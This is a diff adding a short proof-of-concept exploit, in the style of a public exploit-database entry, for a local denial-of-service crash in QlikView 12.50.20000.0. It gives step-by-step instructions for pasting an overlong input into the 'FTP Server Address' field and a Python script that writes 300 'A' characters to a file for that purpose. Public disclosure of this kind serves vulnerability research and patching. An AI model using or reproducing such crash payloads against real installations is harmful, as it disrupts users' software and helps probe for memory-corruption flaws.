@@ -1,0 +1,24 @@
+# Exploit Title: QlikView 12.50.20000.0 - 'FTP Server Address' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2020-08-03
+# Vendor Homepage: https://www.qlik.com
+# Software Link: https://www.qlik.com/us/trial/qlik-sense-business
+# Tested Version: 12.50.20000.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash:
+# 1.- Run python code: QlikView_12.50.20000.0.py
+# 2.- Open QlikView_12.50.20000.0.txt and copy content to clipboard
+# 3.- Open "QlikView 12"
+# 4.- File -> "Open FTP ..."
+# 5.- Paste ClipBoard on "FTP Server Address"
+# 6.- Connect
+# 7.- Crashed
+
+#!/usr/bin/env python
+
+buffer = "\x41" * 300
+f = open ("QlikView_12.50.20000.0.txt", "w")
+f.write(buffer)
+f.close()
